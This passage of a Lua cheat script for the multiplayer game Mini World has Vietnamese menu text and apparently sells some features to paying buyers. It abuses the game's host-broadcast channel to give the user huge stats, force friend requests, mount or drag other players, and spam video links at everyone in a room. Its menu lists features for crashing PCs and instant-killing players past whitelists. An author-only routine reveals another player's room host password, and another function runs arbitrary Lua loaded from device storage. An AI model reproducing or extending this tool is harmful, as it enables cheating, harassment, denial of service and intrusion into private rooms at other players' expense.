        local random_radius = airwall_radius + math.random(2, 8)
        
        local rad = math.rad(random_angle)
        local px = center_x + random_radius * math.cos(rad)
        local py = center_y + random_height
        local pz = center_z + random_radius * math.sin(rad)
        
        table.insert(lightning_positions, {x = px, y = py, z = pz})
    end
    
    ShowGameTipsWithoutFilter("#c00ff00Đã tạo tổng cộng " .. #lightning_positions .. " vị trí sét")
    
    local index = 1
    while true do
        -- 同时播放多个闪电（增加密度）
        for i = 1, 5 do  -- 每次同时播放5个闪电
            local pos_index = (index + i * 7) % #lightning_positions + 1
            local pos = lightning_positions[pos_index]
            
            -- 随机大小和持续时间
            local scale = math.random(2, 5)
            local duration = math.random(15, 25)
            
            CurWorld:playSoundAndParticleEffect(
                pos.x, pos.y, pos.z, 0, 0, 0, 0,
                pos.x, pos.y, pos.z,
                'particles/aotu_06_leishenzhichui.ent', scale, duration
            )
        end
        
        index = index + 1
        if index > #lightning_positions then
            index = 1
        end
        
        threadpool:wait(0.05)  -- 更快频率
    end
end)

end


   
   
function cggj()
    if ClientCurGame:isInGame() then
        local tdata = {
            [1] = "player",
            [2] = "setAtt",
            [3] = { AccountManager:getUin(), 99999999, 17 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function jdfk(aa)
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local new_x, new_y, new_z = x / 100, (y / 100) - 1, z / 100
    local tdata = {
        [1] = "block",
        [2] = "placeBlock",
        [3] = { 1, new_x, new_y, new_z, 0, -1 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function jdfk_all(aa)
    ShowGameTipsWithoutFilter('#cFF7aadBật thành công')
    jdfk_all_1 = true
    threadpool:work(function()
        while true do
            if not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
                break
            end
            jdfk(aa)
            threadpool:wait(0.1)
            if not jdfk_all_1 then
                ShowGameTipsWithoutFilter("#cFF7aadTắt thành công")
                break
            end
        end
    end)
end



function wjgr()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 跟随功能（左停止，右开启选择目标跟随自己）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng theo dõi\nBên phải bật và chọn mục tiêu",
    "Chức năng theo dõi",
    nil,
    function(userData, btnType)
        if btnType == 0 then  -- 左侧：停止跟随
            _G.follow_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Đã tắt theo dõi")
            -- 恢复所有人移动权限
            threadpool:work(function()
                threadpool:wait(0.5)
                if not _G.follow_enabled then
                    local num = ClientCurGame:getNumPlayerBriefInfo()
                    for i = 1, num do
                        local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
                        if briefInfo and briefInfo.uin and briefInfo.uin > 1000 then
                            local tdata = {}
                            tdata[1] = "player"
                            tdata[2] = "setActionAttrState"
                            tdata[3] = {briefInfo.uin, 1, true}
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                            end)
                        end
                    end
                    ShowGameTipsWithoutFilter("#c00ffffĐã khôi phục di chuyển cho toàn bộ người chơi")
                end
            end)

        elseif btnType == 1 then  -- 右侧：开启跟随
            _G.follow_enabled = true
            -- 判断是否在游戏内
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Hãy vào phòng game trước")
                _G.follow_enabled = false
                return
            end

            LoadHomelandLuas()
            local uin_list = GetPlayerUinList()
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000Không có người chơi khác trong phòng")
                _G.follow_enabled = false
                return
            end

            -- 玩家列表UI配置
            local data = {
                visit = {
                    history_num = "Chọn mục tiêu theo dõi",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end

            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Chọn người chơi sẽ theo bạn")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để xác nhận theo dõi")

            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            function ctrl:EnterFriendHomeBtn_OnClick()
                GetInst("UIManager"):Close("HomeEventRecord")
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                local targetUin = this:GetClientID()

                -- 白名单拦截

                ShowGameTipsWithoutFilter("#c00ffffĐã chọn người chơi"..targetUin..", liên tục đi theo bản thân")
                -- 跟随循环线程
                threadpool:work(function()
                    while _G.follow_enabled do
                        -- 获取自身坐标
                        local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                        local new_x = x / 100
                        local new_y = y / 100
                        local new_z = z / 100
                        -- 导航跟随指令
                        local tdata = {}
                        tdata[1] = "actor";
                        tdata[2] = "tryNavigationToPos";
                        tdata[3] = {targetUin,new_x,new_y,new_z,true,true}
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                        end)

                        threadpool:wait(0.1)
                    end
                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp theo dõi đã kết thúc")
                end)
            end
        end
    end
)
end

function qzhy()
    ShowPlayerList(function(uin)
     if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("#RCấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "player",
            [2] = "SendFriendApply",
            [3] = { uin, AccountManager:getUin() }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Ép kết bạn")
end

function sqfw()
    if ClientCurGame:isInGame() then
        local tdata = {
            [1] = "player",
            [2] = "setCheckBoxScale",
            [3] = { AccountManager:getUin(), 1000 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function qswj()
    ShowPlayerList(function(uin)
     if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("#RCấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "player",
            [2] = "mountActor",
            [3] = { AccountManager:getUin(), uin, -1 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Cưỡi lên người chơi")
end


function pbsw()
-- 获取死亡界面整套MVC
local DeathFrameCtrl, DeathFrameModel, DeathFrameView = GetInst("MiniUIManager"):GetMVC("DeathFrameAutoGen")

-- 死亡弹窗拦截统一回调
local function BlockDeathUI()
    -- 关闭死亡界面容器
    GetInst("MiniUIManager"):CloseUI("DeathFrameAutoGen")
    -- 可选弹出提示，不需要可以删掉
    ShowGameTipsWithoutFilter("#RĐã chặn cửa sổ tử vong")
end

-- 重写死亡事件分发入口，拦截弹出逻辑
local Old_FGUIHandleEvent = DeathFrameCtrl.FGUIHandleEvent
function DeathFrameCtrl:FGUIHandleEvent(eventName)
    -- 捕获主角死亡事件直接拦截
    if eventName == "GE_MAINPLAYER_DIE" then
        -- 延迟极短时间，循环两次发送改血广播
        threadpool:delay(0.00000001, function()
            -- 循环2次发送setAtt指令
            for i = 1, 2 do
                local tdata = {}
                tdata[1] = "player";
                tdata[2] = "setAtt";
                tdata[3] = {AccountManager:getUin(),5201314,2}
                -- 向宿主广播任务消息
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end
        end)
        
        BlockDeathUI()
        return
    end
    -- 其余事件保留原有逻辑正常执行
    return Old_FGUIHandleEvent(self, eventName)
end

-- 额外兜底：重写界面刷新前置方法，就算界面要创建也直接拦截
local Old_BeforeRefresh = DeathFrameCtrl.BeforeRefresh
function DeathFrameCtrl:BeforeRefresh()
    BlockDeathUI()
    return Old_BeforeRefresh(self)
end
end

function ggmx()
    if ClientCurGame:isInGame() then
        local tdata = {
            [1] = "actor",
            [2] = "changeCustomModel",
            [3] = { AccountManager:getUin(), "mob_3501" }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function wqfm()
    if ClientCurGame:isInGame() then
        local nameList = { 5, 6, 7, 8, 10 }
        for _, enchantId in ipairs(nameList) do
            local tdata = {
                [1] = "actor",
                [2] = "addEnchant",
                [3] = { AccountManager:getUin(), 5, enchantId, 5 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function lua_load_OnClick()
    threadpool:work(function()
        local prefix = '/storage/emulated/0/'
        local file, err = io.open(prefix .. "amn.lua", "rb")
        
        if not file then
            ShowGameTipsWithoutFilter("Không phát hiện thấy tệp")
            return
        end
        
        local content = file:read("*a")
        file:close()
        
        local status, result = pcall(loadstring(content))
        if not status then
            ShowGameTipsWithoutFilter("Lỗi: " .. tostring(result))
        else
            result()
        end
    end)
end

-- ==================== 主菜单 ====================
function Functions(texta, gnaaa)
    local songbookv = GetInst("MiniUIManager"):GetMVC("main_songbookAutoGen")
    
    function songbookv:RefreshLeftList()
        self.view.widgets.title:setText(texta[math.random(1, #texta)])
        self.view.widgets.n7:setText("Khu chức năng")
        self.view.widgets.n11:setText("")
        self.view.widgets.n12:setVisible(false)
        self.view.widgets.n29:setVisible(false)
        self.view.widgets.randomBtn:setVisible(false)
        self.view.widgets.btn1:setTitle("Xác nhận")
        self.view.widgets.n31:setText("Ai sẽ kiên nhẫn an ủi chàng thiếu niên ngây ngô ấy")
        self.view.widgets.n10:setText("ID vật phẩm đang cầm:" .. CurMainPlayer:getCurToolID())
        
local strs = {}
for i = 1, #gnaaa do
    if i == 4 then
        table.insert(strs, "Phát nhạc")   -- 第四区显示为“播放音乐”
    else
        table.insert(strs, "Chức năng" .. i .. "Khu")
    end
end
self.view.widgets.leftListView:setNumItems(#strs)

for i = 1, #strs do
    local itemObj = self.view.widgets.leftListView:getChildAt(i - 1)
    itemObj:getChild("title"):setText(strs[i])
    itemObj:setName(i)
end
end
    
    
    
    
    function songbookv:RenderListItem2(scoreDef, itemObj, i)
        itemObj:getController("推荐乐器"):setSelectedIndex(7)
        itemObj:getChild("n16"):setText(scoreDef[1])
        itemObj:getChild("n18"):setText(scoreDef[4] or ("Số thứ tự" .. i))
        itemObj:getChild("n19"):setText("")
        itemObj.path = scoreDef[3] or scoreDef[1]
        itemObj.audioname = scoreDef[2]
    end
    
    function songbookv:RefreshList()
        self.view.widgets.n9:setText("Số chức năng:" .. #gnaaa[self.selectLeftIndex])
        self.view.widgets.listView:setNumItems(#gnaaa[self.selectLeftIndex])
        for i = 1, #gnaaa[self.selectLeftIndex] do
            local itemObj = self.view.widgets.listView:getChildAt(i - 1)
            self:RenderListItem2(gnaaa[self.selectLeftIndex][i], itemObj, i)
            itemObj:setName(i)
        end
    end
    
    function songbookv:okBtnClick(obj, context)
        local itemObj = self.view.widgets.listView:getChildAt(self.selectIndex - 1)
        if itemObj.audioname then
            threadpool:work(function() itemObj.audioname(itemObj.path) end)
            ShowGameTipsWithoutFilter("#cFF7aad" .. gnaaa[self.selectLeftIndex][self.selectIndex][1] .. "Đã bật")
        else
            ShowGameTipsWithoutFilter("#cff0000Chức năng chưa được cấp quyền hoặc không tồn tại")
        end
    end
    
    function songbookv:ResourceCenterClick(obj, context)
        threadpool:work(function()
            if not ResourceCenterMidiEntryIsOpen() then
                ShowGameTipsWithoutFilter(GetS(120101))
                return
            end
            GetInst("UIManager"):Open("ResourceCenter", { lockMidi = true })
        end)
    end
    
    GetInst("MiniUIManager"):OpenUI("main_songbook", "miniui/miniworld/music_roleplay", "main_songbookAutoGen")
end

-- ==================== 主菜单按钮 ====================
if CurWorld and CurMainPlayer then
GetInst("QQMusicPlayerManager"):ShowUI()
getglobal("AccChangeColorBtn"):Show()
    TaskTrackFrame = getglobal("TaskTrackFrame")


TaskTrackFrame:Show();
getglobal("TaskTrackFrameTitle"):SetText("Chức năng tùy chỉnh")
		getglobal("TaskTrackFrameDesc"):SetText("#RCảm ơn bạn đã từng ghé qua", 255, 255, 255);
		SetItemIcon(getglobal("TaskTrackFrameIcon"), 10119)
	getglobal("TaskTrackFrame"):SetPoint("topright", "PlayMainFrame", "topright", -1200, 150 )
    getglobal("PlayMainFrameFly"):Show();
    getglobal("PlayMainFrameFly"):SetPoint("top", "PlayMainFrameFlyUp", "bottom", -80, 2);
    
    
    function SetMenuFrameFAQBtn()
    getglobal("SetMenuFrame"):Hide();
    
    -- 获取当前设备的ID
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not author[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho tác giả", 3)
        return
    end
ShowTextInputSafe(function(text)
        local raw_Uin = text
        local roomID = ""
        local hostPassword = ""
        local num_Uin = tonumber(raw_Uin)
        local query_Uin
        
        if num_Uin then
            query_Uin = num_Uin < 1000000000 and (num_Uin + 1000000000) or num_Uin
        else
            query_Uin = raw_Uin
        end
        
        local ret, data = BuddyManager:query_friend_info(query_Uin, true)
        
        if ret == 0 and type(data) == "table" then
            local statusinfo = data.statusinfo or {}
            roomID = tostring(statusinfo[2] or "")
            local roominfo_str = statusinfo[3]
            
            if type(roominfo_str) == "string" and roominfo_str ~= "" then
                local f, err = loadstring("return " .. roominfo_str)
                if f then
                    local ok, roominfo = pcall(f)
                    if ok and type(roominfo) == "table" then
                        local pwd = roominfo.hostPassword or ""
                        if type(pwd) == "string" and pwd ~= "" then
                            hostPassword = pwd
                        end
                    end
                end
            end
        end
        
        if roomID == "" then
            ShowGameTipsWithoutFilter("#cFFAAFFThông #cFFBBEEbáo #cFFCCDDnhắc #cFFDDCCnhở#cFFEEBB: #RNgười chơi này chưa vào phòng"..hostPassword)
        elseif string.find(roomID, "-", 1, true) ~= nil then
            ShowGameTipsWithoutFilter("#cFFAAFFThông #cFFBBEEbáo #cFFCCDDnhắc #cFFDDCCnhở#cFFEEBB: #RKhông hỗ trợ theo dõi máy chủ đám mây")
        else
            FriendChat_ReqFriendRoomByUin(raw_Uin, nil, true, true)
            ShowGameTipsWithoutFilter("#cFFAAFFThông #cFFBBEEbáo #cFFCCDDnhắc #cFFDDCCnhở#cFFEEBB: #YGiải mã mật khẩu thành công"..hostPassword)
        end
        
        local roomDesc = GetInst("RoomService"):ReqQuickUpPlayerRoomInfo(raw_Uin)
        if roomDesc then
            roomDesc.lcl_outTime = os.time() + 1
            GetInst("RoomService"):EnterRoomByDesc(0, false, roomDesc)
        end
    end)
end
    
    
  ---------

    
      
        
          ----------自定义召唤生物  
    
    
    
 --------------------
 

function SwithLangFrame_OnShow()
	if ClientCurGame and ClientCurGame:isInGame() then
		ClientCurGame:setOperateUI(true)
	end
	local oldGetS = GetS
GetS = function(id)
    if id == 3499 then
        return "Giao diện chức năng VIP"
    end
    return oldGetS(id)
end
getglobal("SwitchLangFrameTitleFrameName"):SetText(GetS(3499))

	if lang_now == 999 then
		lang_now = get_game_lang()
	end
	local isOversea = get_game_env() >= 10
	if isOversea then
		local lang_index
		if lang_now == 2 then
			lang_index = 0
		elseif lang_now > 2 then
			lang_index = lang_now - 1
		else
			lang_index = lang_now
		end
		getglobal("SwitchLangFrameLayout"):Hide()
		getglobal("SwitchLangFrameLayoutOversea"):Show()
		getglobal("SwitchLangFrameLayoutOverseaLang" .. lang_index):Checked()
	else
		getglobal("SwitchLangFrameLayoutOversea"):Hide()
		getglobal("SwitchLangFrameLayout"):Show()
		getglobal("SwitchLangFrameLayoutLang" .. lang_now):Checked()
	end
	setLangChecked(lang_now)
	Log("call SwithLangFrame_OnShow, lang_now=" .. lang_now)
	local column_ = 0
	local row_ = 0
	local show_cc = 0
	local hasExcepted = false
	for i = 0, 16 do
		local hide_lang = hidden_lang_list()
		for k, v in pairs(hide_lang) do
			local btn_name_prefix = "SwitchLangFrameLayoutLang"
			if isOversea then
				v = v - 1
				btn_name_prefix = "SwitchLangFrameLayoutOverseaLang"
			end
			if v == i then
				local btn_ = getglobal(btn_name_prefix .. v)
				if btn_ then
					btn_:Hide()
					hasExcepted = true
					break
				end
			end
		end
		if not hasExcepted then
			local btn_, txt_
			if isOversea then
				btn_ = getglobal("SwitchLangFrameLayoutOverseaLang" .. i)
				txt_ = getglobal("SwitchLangFrameLayoutOverseaLang" .. i .. "Tips")
			else
				btn_ = getglobal("SwitchLangFrameLayoutLang" .. i)
				txt_ = getglobal("SwitchLangFrameLayoutLang" .. i .. "Tips")
			end
			if get_game_lang() == gb_enumLang.LANGUAGE_THA and txt_ and isOversea and i ~= 0 and i ~= 6 and i ~= 7 then
				txt_:SetFontType("BlackFont35")
			end
			if btn_ then
				if isOversea then
					if GameLanguageCsv and GameLanguageCsv.idLanguage then
						if txt_ then
							local langIndex = lang_list[i + 1]
							local def = GameLanguageCsv:idLanguage(langIndex)
							local langTxt = def.name
							local canOperate = def.optional
							if tonumber(canOperate) == 0 then
								btn_:Hide()
							end
							txt_:SetText(langTxt)
						end
					elseif txt_ then
						if i == 0 then
		         txt_:SetText(GetS(3497))
						elseif i == 1 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9998 then
        return "Chống PC hạ gục tức thì"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9998))
elseif i == 2 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9997 then
        return "Làm treo PC"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9997))
elseif i == 3 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9996 then
        return "Hạ gục lặp toàn phòng"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9996))
elseif i == 4 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9995 then
        return "Hạ gục tức thì bỏ qua danh sách trắng"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9995))
elseif i == 5 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9994 then
        return "Tùy chỉnh bắn vật thể ném"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9994))
elseif i == 6 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9993 then
        return "Chỉ định C người chơi"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9993))

elseif i == 7 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9992 then
        return "Siêu hạ gục tức thì"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9992))
elseif i == 8 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9991 then
        return "Chỉ định phát vô hạn"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9991))
						elseif i == 15 then
							txt_:SetText("Malaysia")
						else
							txt_:SetText(GetS(973 + i))
						end
					end
				elseif i < 3 then
					txt_:SetText(GetS(3495 + i))
				elseif i == 15 then
					txt_:SetText("Malaysia")
				else
					txt_:SetText(GetS(972 + i))
				end
			end
		end
		hasExcepted = hasExcepted and false
	end
	if isOversea then
		getglobal("SwitchLangFrameLayoutOversea"):UpdateLayout()
	else
		getglobal("SwitchLangFrameLayout"):UpdateLayout()
	end
	if GetInst("MiniUIManager") then
		GetInst("MiniUIManager"):PushNoMvcUIViewTemplateToHistory("SwitchLangFrame", SwithLangFrame_OnHide)
	end
end


-- ============================================================================
-- 函数名：setLangChecked
-- 功能：设置语言选择界面中当前选中语言的按钮状态（禁用/启用）
-- 参数：op - 当前选中的语言ID（数值类型）
-- 返回值：无
-- ============================================================================
function setLangChecked(op)
    -- 判断当前游戏环境是否为海外版（游戏环境ID >= 10 为海外版）
    local isOversea = get_game_env() >= 10
    
    -- ========== 海外版语言列表配置 ==========
    if isOversea then
        -- 海外版语言ID映射表（索引从0开始，与UI按钮索引对应）
        -- 注意：这里的顺序决定了按钮的排列顺序
        lang_list = {
            2,   -- 索引0：语言ID 2
            1,   -- 索引1：语言ID 1
            3,   -- 索引2：语言ID 3
            4,   -- 索引3：语言ID 4
            5,   -- 索引4：语言ID 5
            6,   -- 索引5：语言ID 6
            7,   -- 索引6：语言ID 7
            8,   -- 索引7：语言ID 8
            9,   -- 索引8：语言ID 9
            10,  -- 索引9：语言ID 10
            11,  -- 索引10：语言ID 11
            12,  -- 索引11：语言ID 12
            13,  -- 索引12：语言ID 13
            14,  -- 索引13：语言ID 14
            15,  -- 索引14：语言ID 15
            16,   -- 索引15：语言ID 16
            17
        }
        
        -- 遍历海外版语言列表，设置每个按钮的状态
        for k, v in pairs(lang_list) do
            -- 根据索引构建按钮名称（海外版按钮名称格式：SwitchLangFrameLayoutOverseaLang + 索引）
            -- 注意：k从1开始，需要减1得到0基索引
            local btn = getglobal("SwitchLangFrameLayoutOverseaLang" .. k - 1)
            
            if btn then
                -- 如果当前语言ID匹配，则禁用该按钮（表示当前选中）
                if v == op then
                    Log("v==" .. op)  -- 调试日志：匹配成功
                    btn:Enable()       -- 启用按钮（可点击）
                else
                    -- 如果不匹配，则启用并取消选中状态
                    Log("v!=" .. op)  -- 调试日志：不匹配
                    btn:Enable()       -- 启用按钮（可点击）
                    btn:DisChecked()   -- 取消选中状态（取消高亮/勾选）
                end
            end
        end
        
    -- ========== 国内版语言列表配置 ==========
    else
        -- 遍历国内版语言列表（lang_list 应该在其他地方定义）
        for k, v in pairs(lang_list) do
            -- 国内版按钮名称格式：SwitchLangFrameLayoutLang + 语言ID
            local btn = getglobal("SwitchLangFrameLayoutLang" .. v)
            
            if btn then
                -- 如果当前语言ID匹配，则禁用该按钮
                if v == op then
                    Log("v==" .. op)  -- 调试日志：匹配成功
          btn:Enable()       -- 启用按钮（可点击）
                else
                    -- 如果不匹配，则启用并取消选中状态
                    Log("v!=" .. op)  -- 调试日志：不匹配
                    btn:Enable()       -- 启用按钮（可点击）
                    btn:DisChecked()   -- 取消选中状态（取消高亮/勾选）
                end
            end
        end
    end
end



-- ============================================================================
-- 函数名：SwithLangFrame_OnClick
-- 功能：处理语言切换界面中语言按钮的点击事件
-- 参数：op - 点击的语言ID（数值类型），特殊值999表示关闭界面
-- 返回值：无
-- ============================================================================
function SwithLangFrame_OnClick(op)
    -- 打印调试日志，记录点击的语言ID和当前语言ID
    Log("call SwithLangFrame_OnClick=" .. op .. "/" .. lang_now)
    
    -- ========== 情况1：点击关闭按钮（op == 999） ==========
    if op == 999 then
        -- 直接隐藏语言切换界面，不进行任何语言切换操作
        getglobal("SwitchLangFrame"):Hide()
        
           elseif op == 1 then
        -- 执行防电脑功能
        Log("执行防电脑功能")
        ExecuteAntiBotLogic()
    -- ========== 情况2：点击的语言与当前语言相同 ==========
    elseif op == 3 then
        -- 执行防电脑功能
        Log("执行崩电脑功能")
        bdn()
        
        elseif op == 4 then
        -- 执行防电脑功能
        Log("执行崩电脑功能")
        xhjs()
        elseif op == 5 then
        -- 执行防电脑功能
        Log("执行崩电脑功能")
        mswsbmd()
        elseif op == 6 then
        -- 执行防电脑功能
        Log("执行崩电脑功能")
        zdtzw()
        elseif op == 7 then
        -- 执行防电脑功能
        Log("执行崩电脑功能")
        zdcr()
        elseif op == 8 then
        -- 执行防电脑功能
        Log("执行崩电脑功能")
        cjms()
        elseif op == 9 then
        -- 执行防电脑功能
        Log("执行崩电脑功能")
        bfsp()
    -- ========== 情况3：点击了不同的语言 ==========
    
          
    end
end



function bfsp()
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not author8[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua", 3)
        return
    end
    
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 全局开关，控制视频广播循环
_G.video_broadcast_loop = false

GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái tắt\nBên phải bật",
    "Phát quảng bá video",
    nil,
    function(userData, btnType)
        if btnType == 0 then
            -- 点击关闭：开关置false，循环自动终止
            _G.video_broadcast_loop = false
            ShowGameTipsWithoutFilter("#cFF0000Vòng lặp quảng bá video đã tắt, dừng gửi gói")
        elseif btnType == 1 then
            ShowGameTipsWithoutFilter("#c00ffffBắt đầu lặp gửi toàn bộ liên kết video trong danh sách trắng")
            local imgIdList = {
                "fe-test.mini1.cn/jsbridge/test.html?source=https://mnweb.mini1.cn/game/other/videos/HWah1bFHCK.mp4",
                "https://fe-test.mini1.cn/jsbridge/test.html",
                "source=https://mnweb.mini1.cn/game/other/videos/HWah1bFHCK.mp4&openBrowser=3&portrait=2",
                "https://activity.mini1.cn/game/videoplay.html?source=https://mnweb.mini1.cn/game/other/videos/HWah1bFHCK.mp4&openBrowser=3&portrait=2",
                "http://ws-mdownload.mini1.cn/party/20221010110704.mp4",
                "https://mdownload.miniworldgame.com/party/20230317112429.mp4",
                "http://mdownload.miniworldgame.com/party/20230317105638.mp4",
                "https://mdownload.miniworldgame.com/party/20230317160258.mp4",
                "https://www.youtube.com/watchv=otK1gH_0mtA&t=12s",
                "https://mdownload.miniworldgame.com/party/20230320125716.mp4",
                "https://mdownload.miniworldgame.com/party/20230320130658.mp4",
                "https://mdownload.miniworldgame.com/party/20230619110237.mp4",
                "https://mdownload.miniworldgame.com/party/20240124143704.mp4",
                "https://www.bilibili.com/video/BV1pL411v7Aw?t=35.0",
                "https://youtu.be/TnvKu0I84tI"
            }
            -- 开启循环标记
            _G.video_broadcast_loop = true
            
            -- 只遍历一次房间所有玩家，缓存全部玩家uin，不再重复调用选择界面
            local targetUinList = {}
            ShowPlayerList(function(uin)
                table.insert(targetUinList, uin)
            end, "Đỉnh")

            threadpool:work(function()
                -- 外层一万次循环增加开关判断
                for a = 0, 10000 do
                    -- 检测关闭标记，直接跳出所有循环
                    if not _G.video_broadcast_loop then
                        break
                    end
                    threadpool:wait(0.1)
                    for _, imgid in ipairs(imgIdList) do
                        if not _G.video_broadcast_loop then
                            break
                        end
                        -- 直接用缓存好的玩家uin列表发包，无需重复打开选择玩家界面
                        for _, uin in ipairs(targetUinList) do
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, {"player", "openVideoUrl",{uin,imgid}})
                        end
                    end
                end
                ShowGameTipsWithoutFilter("#cFF0000Vòng lặp gửi video đã hoàn tất hoặc bị dừng thủ công")
            end)
        end
    end
)
end





function cjms()
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not author7[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho người mua", 3)
        return
    end
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 单体秒杀功能（左边停止，右边开启）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng hạ gục tức thì\nBên phải bật và chọn mục tiêu",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止秒杀 =====
            _G.dtms_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Đã dừng hạ gục tức thì")
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启秒杀 =====
            _G.dtms_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Hãy vào phòng game trước")
                _G.dtms_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000Phòng hiện tại không có người chơi khác")
                _G.dtms_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "Chọn mục tiêu hạ gục tức thì",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Hãy chọn người chơi cần hạ gục tức thì")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để bắt đầu hạ gục tức thì")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
